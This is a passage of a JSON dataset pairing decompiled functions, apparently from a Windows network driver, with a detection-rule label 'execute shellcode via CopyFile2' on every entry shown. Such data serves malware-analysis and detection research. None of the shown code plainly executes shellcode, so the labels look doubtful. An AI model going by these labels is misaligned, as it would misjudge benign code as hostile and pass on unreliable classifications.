0xff) * 4 + 0x13460);\n    uVar12 = *((uVar18 & 0xff) * 4 + 0x13860) ^ *(uVar20 * 4 + 0x13460) ^ *(uVar14 * 4 + 0x13c60) ^ uVar7 ^ uVar6 ^\n             uVar12;\n    uVar20 = uVar12 >> 0x10 & 0xff;\n    auStack136[12] =\n         *(uVar13 * 4 + 0x13c60) ^ *(uVar16 * 4 + 0x13860) ^ *(uVar15 * 4 + 0x13060) ^ *(uVar14 * 4 + 0x13060) ^ uVar7;\n    auStack136[13] = *(uVar16 * 4 + 0x13460) ^ *((uVar18 & 0xff) * 4 + 0x13460) ^ uVar6 ^ uVar4 ^ uVar5;\n    auStack136[15] =\n         *((uVar12 & 0xff) * 4 + 0x13460) ^ *((uVar12 >> 8 & 0xff) * 4 + 0x13060) ^ *((uVar24 >> 0x18) * 4 + 0x13c60) ^\n         *(uVar20 * 4 + 0x13c60) ^ uVar3;\n    auStack136[14] =\n         *((uVar12 >> 0x18) * 4 + 0x13060) ^ *(uVar11 * 4 + 0x13c60) ^ *(uVar15 * 4 + 0x13860) ^ *(uVar14 * 4 + 0x13860)\n         ^ *(uVar20 * 4 + 0x13460);\n    puVar17 = arg1 + 4;\n    iVar19 = 0;\n    do {\n        *(arg1 + iVar19 * 8) = auStack204[iVar19 + 1];\n        puVar2 = auStack136 + iVar19;\n        iVar19 = iVar19 + 1;\n        *puVar17 = *puVar2 - 0x10 & 0x1f;\n        puVar17 = puVar17 + 2;\n    } while (iVar19 < 0x10);\n    return;\n}\n",
        "token_count": 7614
    },
    "0002e034": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0002e034(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint auStackX16 [6];\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar auStack56 [48];\n    \n    iVar1 = fcn.00061b34(auStack56, 1);\n    if (iVar1 == 0) {\n        uStack60 = 0x1f01ff;\n        uStack72 = 0x120089;\n        uStack68 = 0x120116;\n        uStack64 = 0x1200a0;\n        auStackX16[0] = 4;\n        (*_fcn.00011338)(arg1, auStackX16, auStack56, arg1 + 0x110, 1, &uStack72);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0002ee4c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.0002ee4c(int64_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t aiStackX8 [4];\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        iVar1 = -1;\n    }\n    else {\n        if (arg2 == -1) {\n            piVar3 = NULL;\n        }\n        else {\n            aiStackX8[0] = arg2 * -10000;\n            piVar3 = aiStackX8;\n        }\n        iVar1 = (*_fcn.00011628)(*arg1, 0, 0, 0, piVar3);\n        if (iVar1 == 0) {\n            iVar1 = 1;\n        }\n        else {\n            uVar2 = fcn.00061a5c();\n            fcn.0002fd3c(uVar2);\n            iVar1 = -(iVar1 != 0x102);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 239
    },
    "0002f260": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nbool fcn.0002f260(int64_t *arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ulong auStackX8 [4];\n    \n    if ((arg1 == NULL) || (*arg1 == 0)) {\n        bVar2 = false;\n    }\n    else {\n        auStackX8[0] = 0;\n        iVar1 = (*_fcn.00011628)(*arg1, 0, 0, 0, auStackX8);\n        bVar2 = iVar1 == 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 130
    },
    "0002f598": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.0002f598(int64_t arg1, ulong arg2)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    ulong uVar3;\n    int16_t *piVar4;\n    ushort uStack152;\n    int16_t iStack150;\n    int64_t iStack144;\n    uchar auStack136 [8];\n    uint uStack128;\n    ulong uStack120;\n    ushort *puStack112;\n    \n    if ((arg1 == 0) || (arg2 < 5)) {\n        uVar3 = 0x21590008;\n    }\n    else {\n        fcn.00061b2e(auStack136, 0x70);\n        piVar4 = 0x14098;\n        do {\n            iVar1 = *piVar4;\n            *(arg1 + -0x14098 + piVar4) = iVar1;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        iStack144 = arg1 + 8;\n        uStack120 = 0x140a8;\n        puStack112 = &uStack152;\n        iStack150 = arg2 * 2 + -8;\n        uStack152 = 0;\n        uStack128 = 0x24;\n        uVar2 = fcn.00061b28(3, 0, auStack136, 0, 0);\n        uVar3 = fcn.00061a5c(uVar2);\n    }\n    return uVar3;\n}\n",
        "token_count": 335
    },
    "0002f96c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0002f96c(ulong arg1, ulong arg2)\n\n{\n    uchar auStackX24 [16];\n    \n    fcn.0002f814(arg1, arg2, auStackX24);\n    return;\n}\n",
        "token_count": 53
    },
    "0002ff64": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.0002ff64(ulong arg1)\n\n{\n    int32_t iVar1;\n    uchar auStack56 [16];\n    uchar auStack40 [8];\n    uint uStack32;\n    \n    iVar1 = fcn.00061a74(arg1, auStack56, auStack40, 0x18, 5);\n    if (iVar1 != 0) {\n        uStack32 = 0xffffffff;\n    }\n    return uStack32;\n}\n",
        "token_count": 103
    },
    "00031000": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00031000(ulong *arg1)\n\n{\n    int64_t iVar1;\n    \n    *arg1 = 0;\n    arg1[1] = 0;\n    arg1[2] = 0;\n    iVar1 = fcn.0002fbf0(0x78);\n    arg1[2] = iVar1;\n    (*_fcn.00011380)(iVar1 + 0x40, 0);\n    (*_fcn.000113f8)(arg1[2], 0, 0x7fffffff);\n    // WARNING: Could not recover jumptable at 0x00031055. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_fcn.000113f8)(arg1[2] + 0x20, 0, 0x7fffffff);\n    return;\n}\n",
        "token_count": 189
    },
    "000327e8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.000327e8(void)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    ulong uVar3;\n    uchar auStackX8 [32];\n    \n    uVar3 = 0;\n    fcn.00031564(0x7b148, auStackX8, 0);\n    puVar2 = *0x7b140;\n    do {\n        if (puVar2 == NULL) {\ncode_r0x0003282f:\n            fcn.00031598(0x7b148, auStackX8, 0);\n            return uVar3;\n        }\n        iVar1 = fcn.000362c0(puVar2[2]);\n        puVar2[4] = iVar1;\n        if (iVar1 == 0) {\n            uVar3 = 0xc0000001;\n            goto code_r0x0003282f;\n        }\n        puVar2 = *puVar2;\n    } while( true );\n}\n",
        "token_count": 217
    },
    "00032b00": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00032b00(void)\n\n{\n    int64_t iVar1;\n    ulong arg1;\n    uchar auStackX8 [32];\n    \n    arg1 = 0;\n    while( true ) {\n        fcn.00031564(0x7b148, auStackX8, 0);\n        iVar1 = *0x7b140;\n        if (*0x7b140 != 0) {\n            arg1 = *(*0x7b140 + 0x18);\n        }\n        fcn.00031598(0x7b148, auStackX8, 0);\n        if (iVar1 == 0) break;\n        fcn.0003284c(arg1);\n    }\n    if (*0x7b138 != 0) {\n        (**0x110a0)();\n    }\n    fcn.00052250(0x7b160);\n    fcn.00052250(0x7b168);\n    *0x7b2f0 = 0;\n    return;\n}\n",
        "token_count": 225
    },
    "00032c7c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00032c7c(ulong arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    ulong unaff_RBX;\n    int64_t iVar3;\n    ulong unaff_RBP;\n    int32_t iVar4;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    int64_t iVar5;\n    ulong noname_3;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    int32_t in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t in_stack_00000018;\n    uint32_t uVar6;\n    uint in_stack_0000001c;\n    int64_t noname_19;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    uint uVar7;\n    uint in_stack_ffffffffffffffac;\n    ulong in_stack_ffffffffffffffb0;\n    ulong arg1_00;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    ulong in_stack_ffffffffffffffd0;\n    ulong in_stack_ffffffffffffffd8;\n    \n    arg1_00 = 0;\n    noname_19 = 0;\n    uVar2 = fcn.00038d04(arg1, &stack0x00000020, &stack0x00000010);\n    if (uVar2 == 0) {\n        *0x7b140 = 0;\n        fcn.000313e0(0x7b148);\n        noname_3 = 0x50;\n        uVar7 = 0x20;\n        (**0x11090)(&stack0x00000018, 0x7b138, 0x100);\n        if (((((in_stack_00000018 == 0) &&\n              (uVar6 = in_stack_00000018,  in_stack_00000018 = fcn.0002f96c(0x14570, &stack0xffffffffffffffb8), \n              in_stack_00000018 == 0)) &&\n             (in_stack_00000018 = fcn.0004afbc(arg1_00, 0x14830, &stack0xffffffffffffffc0),  in_stack_00000018 == 0)) &&\n            ((in_stack_00000018 = fcn.0004afbc(arg1_00, 0x14818, &stack0xffffffffffffffc8),  in_stack_00000018 == 0 &&\n             (in_stack_00000018 =\n                   fcn.00051f30(in_stack_ffffffffffffffc0, 0x32c30, 0x7b160, noname_3, \n                                CONCAT44(in_stack_ffffffffffffffac, uVar7), in_stack_ffffffffffffffb0, arg1_00, \n                                in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, in_stack_ffffffffffffffd0, \n                                in_stack_ffffffffffffffd8, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000\n                                , in_stack_00000008, CONCAT44(in_stack_00000014, in_stack_00000010), \n                                CONCAT44(in_stack_0000001c, uVar6), noname_19, in_stack_00000028, in_stack_00000030, \n                                in_stack_00000038, in_stack_00000040),  in_stack_00000018 == 0)))) &&\n           (in_stack_00000018 =\n                 fcn.00051f30(in_stack_ffffffffffffffc8, 0x32b90, 0x7b168, noname_3, \n                              CONCAT44(in_stack_ffffffffffffffac, uVar7), in_stack_ffffffffffffffb0, arg1_00, \n                              in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, in_stack_ffffffffffffffd0, \n                              in_stack_ffffffffffffffd8, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX, in_stack_00000000, \n                              in_stack_00000008, CONCAT44(in_stack_00000014, in_stack_00000010), \n                              CONCAT44(in_stack_0000001c, uVar6), noname_19, in_stack_00000028, in_stack_00000030, \n                              in_stack_00000038, in_stack_00000040),  in_stack_00000018 == 0)) {\n            *0x7b2f0 = 1;\n            iVar4 = 0;\n            if (0 < in_stack_00000010) {\n                iVar5 = 0;\n                do {\n                    if (noname_19 == 0) break;\n                    iVar3 = *(iVar5 + noname_19);\n                    do {\n                        iVar1 = *(iVar3 + 0x10);\n                        iVar3 = *(iVar1 + 0x10);\n                        (**0x11098)(iVar1);\n                        if (iVar3 == 0) break;\n                    } while (iVar1 != iVar3);\n                    in_stack_00000018 =\n                         fcn.00032a40(*(*0x88a0c + *(iVar5 + noname_19)), *(iVar1 + 0x18), *(iVar5 + noname_19));\n                    if ((in_stack_00000018 != 0) ||\n                       (in_stack_00000018 = fcn.00032950(*(iVar5 + noname_19)),  in_stack_00000018 != 0))\n                    goto code_r0x00032e32;\n                    iVar4 = iVar4 + 1;\n                    iVar5 = iVar5 + 8;\n                } while (iVar4 < in_stack_00000010);\n            }\n        }\n        else {\ncode_r0x00032e32:\n            fcn.00032b00();\n        }\n        fcn.0002fc50(noname_19);\n        uVar2 = in_stack_00000018;\n    }\n    return uVar2;\n}\n",
        "token_count": 1354
    },
    "00032f90": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.00032f90(ulong arg1)\n\n{\n    int64_t iVar1;\n    ulong uStackX16;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    \n    uStackX16 = 0;\n    uStackX24 = 0;\n    fcn.00031564(0x7b1c0, auStackX32, 1);\n    iVar1 = fcn.00032eb0(arg1, 1);\n    if (iVar1 != 0) {\n        uStackX16 = *(iVar1 + 0x10);\n        uStackX24 = *(iVar1 + 0x18);\n        *(iVar1 + 0x10) = 0;\n        *(iVar1 + 0x18) = 0;\n    }\n    fcn.00031598(0x7b1c0, auStackX32, 1);\n    fcn.00052250(&uStackX16);\n    fcn.00052250(&uStackX24);\n    return 0;\n}\n",
        "token_count": 231
    },
    "00033210": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nulong fcn.00033210(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    ulong uVar2;\n    int64_t **ppiVar3;\n    int64_t **arg1_00;\n    int64_t **ppiVar4;\n    uchar auStackX8 [32];\n    \n    if (arg1 == NULL) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        fcn.00032f90(arg1);\n        fcn.00031564(0x7b1c0, auStackX8, 1);\n        arg1_00 = *0x7b1e0;\n        ppiVar4 = NULL;\n        ppiVar1 = *0x7b1e0;\n        if (*0x7b1e0 != NULL) {\n            do {\n                ppiVar3 = arg1_00;\n                arg1_00 = ppiVar3;\n                if (ppiVar3[5] == arg1) break;\n                arg1_00 = *ppiVar3;\n                ppiVar4 = ppiVar3;\n            } while (arg1_00 != NULL);\n            if ((arg1_00 != NULL) && (ppiVar1 = *arg1_00,  ppiVar4 != NULL)) {\n                *ppiVar4 = *arg1_00;\n                ppiVar1 = *0x7b1e0;\n            }\n        }\n        *0x7b1e0 = ppiVar1;\n        fcn.00031598(0x7b1c0, auStackX8, 1);\n        if (arg1_00 == NULL) {\n            uVar2 = 0xc00000ef;\n        }\n        else {\n            fcn.0002fc50(arg1_00);\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 416
    },
    "000343a4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.000343a4(void)\n\n{\n    int64_t iVar1;\n    ulong arg1;\n    uchar auStackX8 [32];\n    \n    fcn.00052250(0x7b2e0);\n    fcn.00052250(0x7b2d8);\n    fcn.00052250(0x7b2c0);\n    fcn.00052250(0x7b2b8);\n    fcn.00052250(0x7b2b0);\n    arg1 = 0;\n    while( true ) {\n        fcn.00031564(0x7b290, auStackX8, 1);\n        iVar1 = *0x7b2a8;\n        if (*0x7b2a8 != 0) {\n            arg1 = *(*0x7b2a8 + 0x10);\n        }\n        fcn.00031598(0x7b290, auStackX8, 1);\n        if (iVar1 == 0) break;\n        fcn.00033e50(arg1);\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "00035e4c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00035e4c(ulong arg1)\n\n{\n    int64_t arg3;\n    ulong arg4;\n    int64_t arg2;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int64_t arg1_00;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    code *pcVar5;\n    ulong arg1_01;\n    int64_t iVar6;\n    uint64_t uVar7;\n    int32_t iVar8;\n    bool bVar9;\n    ushort uStackX16;\n    ushort uStackX18;\n    uint auStackX24 [2];\n    uchar auStackX32 [8];\n    int64_t iStack232;\n    uchar auStack224 [8];\n    uchar uStack216;\n    uchar uStack215;\n    ushort uStack214;\n    uchar *puStack208;\n    uint *puStack200;\n    uint uStack192;\n    uchar *puStack184;\n    ushort *puStack176;\n    uint uStack168;\n    uchar auStack160 [24];\n    uchar auStack136 [80];\n    \n    uVar3 = 0;\n    uStackX16 = 0x888e;\n    uStackX18 = 0x8100;\n    iVar8 = 0;\n    auStackX24[0] = 0;\n    iStack232 = 0;\n    arg1_00 = fcn.0002fbf0(0x208);\n    if (arg1_00 == 0) {\n        uVar3 = 0x21590004;\n    }\n    else {\n        fcn.00031564(0x7b290, auStack224, 0);\n        LOCK();\n        bVar9 = *0x7b2f0 == 0;\n        *0x7b2f0 = *0x7b2f0 ^ bVar9 * *0x7b2f0;\n        if (bVar9) {\n            fcn.00031598(0x7b290, auStack224, 0);\n            uVar3 = 0x21590006;\n        }\n        else {\n            uVar4 = fcn.00036bf8(arg1, 1);\n            if (uVar4 == 0) {\n                uVar3 = uVar4;\n                uVar7 = 0xc000000d;\n            }\n            else {\n                uVar7 = uVar3;\n                if (*(uVar4 + 0x1a) != 0x24) {\n                    fcn.00061a3e(arg1_00);\n                    *(arg1_00 + 0x206) = 0;\n                    uVar3 = uVar4;\n                    uVar7 = 0;\n                }\n            }\n            fcn.00031598(0x7b290, auStack224, 0);\n            if (uVar3 == 0) {\n                return uVar7;\n            }\n            fcn.000619f0(auStack160, arg1_00);\n            fcn.00061a56(&uStack216, 0, 0x38);\n            puStack208 = auStack160;\n            puStack200 = auStackX24;\n            uStack215 = 1;\n            puStack184 = auStackX32;\n            uStack214 = 0x38;\n            puStack176 = &uStackX16;\n            uStack216 = 0x87;\n            uStack192 = 1;\n            uStack168 = 2;\n            pcVar5 = fcn.0005164c(*0x7b2c8);\n            uVar1 = (*pcVar5)(*0x7b270, uVar3, &uStack216, auStack136, &iStack232);\n            if (uVar1 == 0x103) {\n                fcn.00036a98(arg1_00, iStack232, 0, 0);\n                uVar1 = fcn.000358d0(iStack232, 1);\n            }\n            arg2 = iStack232;\n            uVar3 = uVar1;\n            iVar6 = iStack232;\n            if (uVar1 == 0) {\n                do {\n                    arg3 = *(iVar6 + 0x10);\n                    iVar6 = *(arg3 + 0x10);\n                    fcn.000355d8(arg3);\n                    if (iVar6 == 0) break;\n                } while (arg3 != iVar6);\n                arg4 = *(arg3 + 0x18);\n                arg1_01 = fcn.000355d8(arg3);\n                fcn.00036a98(arg1_00, arg2, arg3, arg4);\n                iVar2 = fcn.00034b00(arg1_01);\n                if (iVar2 == 0) {\n                    fcn.00036404(arg2, 0);\n                    fcn.000327e8();\n                }\n                if ((iVar2 != -0x3fffffdf) && (iVar2 != 0)) {\n                    fcn.00036a98(arg1_00, 0, 0, 0);\n                    iVar8 = iVar2;\n                }\n                if (iVar8 == 0) {\n                    fcn.00035ab0(iStack232);\n                }\n                else {\n                    (**0x88af0)();\n                }\n            }\n        }\n        fcn.0002fc50(arg1_00);\n    }\n    return uVar3;\n}\n",
        "token_count": 1192
    },
    "00038d04": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t fcn.00038d04(int64_t arg1, int64_t *arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ulong *puVar5;\n    ulong uVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    int64_t aiStackX8 [3];\n    ulong uStackX32;\n    uint uVar11;\n    int64_t *piVar10;\n    int64_t iStack696;\n    ulong uStack688;\n    ulong uStack680;\n    uchar auStack672 [24];\n    uchar auStack648 [240];\n    uchar auStack408 [48];\n    int64_t iStack360;\n    \n    uVar7 = 0;\n    iStack696 = 0;\n    aiStackX8[0] = 0;\n    if ((arg1 == 0) || (*(arg1 + 0x30) == 0)) {\n        iVar2 = 0x21590065;\n    }\n    else {\n        fcn.000619f0(auStack672, 0x11fb4);\n        fcn.000619f6(auStack408, arg1, 0x150);\n        piVar10 = aiStackX8;\n        uVar6 = *(iStack360 + 0x28);\n        uStackX32 = uVar6;\n        iVar2 = fcn.00038be0(arg1, auStack672, auStack648, &iStack696);\n        iVar8 = aiStackX8[0];\n        if (iVar2 == 0) {\n            do {\n                uVar11 = piVar10 >> 0x20;\n                iVar4 = uVar7;\n                iVar9 = uVar7 + iVar8;\n                cVar1 = (**0x11468)(iVar9);\n                if ((cVar1 == '\\0') || (cVar1 = (**0x11468)(iVar9 + 0xf0),  cVar1 == '\\0')) break;\n                piVar10 = CONCAT44(uVar11, 1);\n                iVar3 = fcn.00061a80(iVar9, auStack648, 0xf0, 1, piVar10);\n                if (iVar3 == 0) goto code_r0x00038e14;\n                uVar7 = iVar4 + 1U;\n            } while (iVar4 + 1U < 0x50);\n            iVar4 = 0;\ncode_r0x00038e14:\n            if (iVar4 != 0) {\n                *0x88a08 = iVar4 + 1;\n                *0x88a04 = iVar4;\n            }\n            *0x88a00 = iVar4;\n            *0x88a10 = fcn.00039a88(aiStackX8[0], 0x200, 0x38bcc);\n            *0x88a1c = fcn.00039a88(aiStackX8[0], 0x200, 0x38bbc);\n            *0x88a24 = fcn.00039a88(aiStackX8[0], 0x200, 0x38b98);\n            *0x88a2c = fcn.00039a88(aiStackX8[0], 0x200, 0x38b78);\n            *0x88a34 = fcn.00039a88(aiStackX8[0], 0x200, 0x38b60);\n            *0x88a44 = fcn.00039a88(aiStackX8[0], 0x200, 0x38b48);\n            *0x88a48 = fcn.00039a88(aiStackX8[0], 0x200, 0x38b2c);\n            *0x88a38 = fcn.00039a88(aiStackX8[0], 0x200, 0x38b10);\n            *0x88a3c = fcn.00039a88(aiStackX8[0], 0x200, 0x38af0);\n            *0x88a4c = fcn.00039a88(aiStackX8[0], 0x200, 0x38ad0);\n            *0x88a20 = fcn.00039a88(aiStackX8[0], 0x200, 0x38ac0);\n            *0x88a28 = fcn.00039a88(aiStackX8[0], 0x200, 0x38aa4);\n            *0x88a68 = fcn.00039a88(aiStackX8[0], 0x200, 0x38a8c);\n            *0x88a6c = fcn.00039a88(aiStackX8[0], 0x200, 0x38a6c);\n            *0x88a70 = fcn.00039a88(aiStackX8[0], 0x200, 0x38a5c);\n            *0x88a0c = fcn.00039a88(aiStackX8[0], 0x200, iStack696);\n            uVar6 = uStackX32;\n            if (arg2 != NULL) {\n                *arg2 = 0;\n                uVar6 = 0;\n                *arg3 = 0;\n                puVar5 = fcn.0002fbf0(8);\n                *arg2 = puVar5;\n                if (puVar5 == NULL) {\n                    iVar2 = -0x3fffff66;\n                    uVar6 = uStackX32;\n                }\n                else {\n                    *puVar5 = 0;\n                    fcn.0001a764(CONCAT71(uVar6 >> 8, 2), &uStack688, &uStack680);\n                    iVar8 = aiStackX8[0];\n                    iVar9 = aiStackX8[0];\ncode_r0x00039039:\n                    if ((iVar8 == 0) || (*arg2 == 0)) goto code_r0x000390a1;\n                    if ((iVar8 == iVar9) || (*(iVar8 + 0x1a) == '\\0')) {\ncode_r0x00039084:\n                        iVar8 = *(iVar8 + 8);\n                        goto code_r0x00039039;\n                    }\n                    iVar4 = fcn.0003055c(arg2, *arg3 << 3, *arg3 + 1 << 3);\n                    if (iVar4 == 0) {\n                        *arg2[*arg3] = iVar8;\n                        *arg3 = *arg3 + 1;\n                        iVar9 = aiStackX8[0];\n                        goto code_r0x00039084;\n                    }\n                    iVar2 = -0x3fffff66;\n                    fcn.0002fc50(*arg2);\n                    *arg2 = 0;\n                    *arg3 = 0;\ncode_r0x000390a1:\n                    fcn.0001a878(uStack688, uStack680);\n                    uVar6 = uStackX32;\n                }\n            }\n        }\n        if (aiStackX8[0] != 0) {\n            (**0x11000)();\n        }\n        if (iStack696 != 0) {\n            (**0x11068)(iStack696, 0);\n        }\n        *(iStack360 + 0x28) = uVar6;\n        fcn.000619f6(arg1, auStack408, 0x150);\n    }\n    return iVar2;\n}\n",
        "token_count": 1689
    },
    "00039b68": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00039b68(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    uint auStackX8 [2];\n    uint auStackX16 [2];\n    uint auStackX24 [2];\n    int64_t iStackX32;\n    ulong in_stack_fffffffffffffcf0;\n    uint64_t uVar6;\n    uint uVar8;\n    ulong uVar7;\n    uchar auStack760 [16];\n    ulong uStack744;\n    uint auStack736 [2];\n    ulong uStack728;\n    uchar *puStack720;\n    uint uStack712;\n    ulong uStack704;\n    ulong uStack696;\n    uchar auStack688 [16];\n    ulong uStack672;\n    uint uStack664;\n    ulong uStack656;\n    ulong uStack648;\n    uint uStack640;\n    uchar uStack636;\n    ulong uStack632;\n    ulong uStack624;\n    ulong uStack616;\n    ulong uStack608;\n    uint uStack600;\n    ushort uStack596;\n    ulong uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    ulong uStack568;\n    ulong uStack560;\n    ulong uStack552;\n    uint uStack544;\n    uchar auStack536 [512];\n    \n    uVar2 = in_stack_fffffffffffffcf0 >> 0x20;\n    uStack632 = *0x14a98;\n    uStack624 = *0x14aa0;\n    uStack672 = *0x14a88;\n    uStack664 = *0x14a90;\n    uStack648 = *0x14a78;\n    uStack640 = *0x14a80;\n    uStack636 = *0x14a84;\n    uStack656 = 0x690064004e;\n    auStackX16[0] = 1;\n    uStack592 = *0x14a60;\n    iStackX32 = 0;\n    uStack584 = *0x14a68;\n    uStack576 = *0x14a70;\n    uStack568 = *0x14a40;\n    uStack560 = *0x14a48;\n    uStack552 = *0x14a50;\n    uStack544 = *0x14a58;\n    uStack616 = *0x14a28;\n    uStack608 = *0x14a30;\n    uStack600 = *0x14a38;\n    uStack596 = *0x14a3c;\n    auStackX24[0] = 2;\n    auStackX8[0] = 2;\n    fcn.00061a0e(*0x14a98, auStack536, 0x100, 0x11ac0, \n                 L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Network\\\\{4d36e974-e325-11ce-bfc1-08002be10318}\"\n                 , L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n    fcn.000619f0(auStack688, auStack536);\n    puStack720 = auStack688;\n    auStack736[0] = 0x30;\n    uStack728 = 0;\n    uStack712 = 0x40;\n    uStack704 = 0;\n    uStack696 = 0;\n    uVar3 = fcn.00061ada(&uStack744, 0xf003f, auStack736, 0, 0, uVar2 << 0x20, auStackX8);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    puVar5 = &uStack656;\n    fcn.00061a0e(auStack536, 0x100, 0x14970, \n                 L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Network\\\\{4d36e974-e325-11ce-bfc1-08002be10318}\"\n                 , L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\", puVar5);\n    fcn.000619f0(auStack688, auStack536);\n    puStack720 = auStack688;\n    uVar6 = puVar5 & 0xffffffff00000000;\n    auStack736[0] = 0x30;\n    uStack728 = 0;\n    uStack712 = 0x40;\n    uStack704 = 0;\n    uStack696 = 0;\n    uVar2 = fcn.00061ada(&iStackX32, 0xf003f, auStack736, 0, 0, uVar6, auStackX8);\n    uVar3 = uVar2;\n    if (uVar2 == 0) {\n        fcn.000619f0(auStack760, &uStack592);\n        iVar4 = -1;\n        puVar5 = &uStack672;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            cVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = uVar6 & 0xffffffff00000000 | ~iVar4;\n        uVar2 = fcn.000619e4(iStackX32, auStack760, 0, 1, &uStack672, uVar6);\n        uVar3 = uVar2;\n        if (uVar2 == 0) {\n            fcn.000619f0(auStack760, &uStack632);\n            iVar4 = -1;\n            puVar5 = &uStack648;\n            do {\n                if (iVar4 == 0) break;\n                iVar4 = iVar4 + -1;\n                cVar1 = *puVar5;\n                puVar5 = puVar5 + 1;\n            } while (cVar1 != '\\0');\n            uVar3 = uVar6 & 0xffffffff00000000 | ~iVar4;\n            uVar2 = fcn.000619e4(iStackX32, auStack760, 0, 1, &uStack648, uVar3);\n            uVar8 = uVar3 >> 0x20;\n            uVar3 = uVar2;\n            if (uVar2 == 0) {\n                fcn.000619f0(auStack760, &uStack568);\n                uVar7 = CONCAT44(uVar8, 4);\n                uVar2 = fcn.000619e4(iStackX32, auStack760, 0, 4, auStackX16, uVar7);\n                uVar8 = uVar7 >> 0x20;\n                uVar3 = uVar2;\n                if (uVar2 == 0) {\n                    fcn.000619f0(auStack760, &uStack616);\n                    uVar2 = 